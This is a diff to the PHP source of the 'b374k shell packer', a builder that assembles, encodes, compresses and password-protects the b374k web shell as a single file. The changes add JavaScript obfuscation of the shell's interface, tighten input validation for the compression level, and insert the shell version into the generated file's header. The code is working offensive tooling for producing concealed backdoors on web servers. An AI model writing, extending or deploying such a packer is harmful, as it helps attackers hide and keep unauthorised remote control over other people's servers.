@@ -7,12 +7,14 @@
 
 */
 $GLOBALS['packer']['title'] = "b374k shell packer";
-$GLOBALS['packer']['version'] = "0.3";
+$GLOBALS['packer']['version'] = "0.4";
 $GLOBALS['packer']['base_dir'] = "./base/";
 $GLOBALS['packer']['module_dir'] = "./module/";
 $GLOBALS['packer']['theme_dir'] = "./theme/";
 $GLOBALS['packer']['module'] = packer_get_module();
 $GLOBALS['packer']['theme'] = packer_get_theme();
+
+require $GLOBALS['packer']['base_dir'].'jsPacker.php';
 
 /* PHP FILES START */
 $base_code = "";
@@ -99,6 +101,8 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 
 		$layout = str_replace("<__CSS__>", $css_code, $layout);
 		$layout = str_replace("<__ZEPTO__>", $zepto_code, $layout);
+		
+		if($strip=='yes') $js_code = packer_pack_js($js_code);
 		$layout = str_replace("<__JS__>", $js_code, $layout);
 
 
@@ -142,7 +146,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 			<?php echo $available_themes; ?>
 			<tr><td colspan='2'>
 				<form method='get' id='runForm' target='_blank'><input type='hidden' id='module_to_run' name='run' value=''>
-				<input type='button' class='button' id='runGo' value='Run'>
+				<span class='button' id='runGo'>Run</span>
 				</form>
 			</td></tr>
 		</table>
@@ -188,7 +192,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 			</td></tr>
 
 			<tr><td colspan='2'>
-				<input type='button' class='button' id='packGo' value='Pack'>
+				<span class='button' id='packGo'>Pack</span>
 			</td></tr>
 			<tr><td colspan='2' id='result'></td></tr>
 			<tr><td colspan='2'><textarea id='resultContent'></textarea></td></tr>
@@ -328,11 +332,12 @@ else{
 
 		$compress_level = isset($opt['c'])? trim($opt['c']):"";
 		if(empty($compress_level)) $compress_level = '9';
-		if(!preg_match("/[0-9]{1}/", $compress_level)){
+		if(!preg_match("/^[0-9]{1}$/", $compress_level)){
 			$output .= "error : unknown options -c ".$compress_level." (use only 0-9)\n\n";
 			echo $output;
 			die();
 		}
+		$compress_level = (int) $compress_level;
 
 		$output .= "Filename\t\t: ".$outputfile."\n";
 		$output .= "Password\t\t: ".$password."\n";
@@ -356,6 +361,8 @@ else{
 
 		$layout = str_replace("<__CSS__>", $css_code, $layout);
 		$layout = str_replace("<__ZEPTO__>", $zepto_code, $layout);
+		
+		if($strip=='yes') $js_code = packer_pack_js($js_code);
 		$layout = str_replace("<__JS__>", $js_code, $layout);
 
 		$htmlcode = trim($layout);
@@ -473,6 +480,11 @@ function packer_check_module($module){
 	return false;
 }
 
+function packer_pack_js($str){
+	$packer = new JavaScriptPacker($str, 0, true, false);
+	return $packer->pack();
+}
+
 function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password){
 	$content = "";
 	if(is_file($output)){
@@ -485,9 +497,14 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 	if($compress_level<0) $compress_level = 0;
 	elseif($compress_level>9) $compress_level = 9;
 
+	$version = "";
+	if(preg_match("/\\\$GLOBALS\['ver'\]\ *=\ *[\"']+([^\"']+)[\"']+/", $phpcode, $r)){
+		$version = $r[1];
+	}
+	
 	$header = "<?php
 /*
-	b374k shell
+	b374k shell ".$version."
 	Jayalah Indonesiaku
 	(c)".@date("Y",time())."
 	https://github.com/b374k/b374k
@@ -540,7 +557,8 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 			$encoder = $encoder_func."(\$x)";
 		}
 		else{
-			$code = $content;
+			$code = $header.$password."?>".$content;
+			$code = preg_replace("/\?>\s*<\?php\s*/", "", $code);
 		}
 	}
 
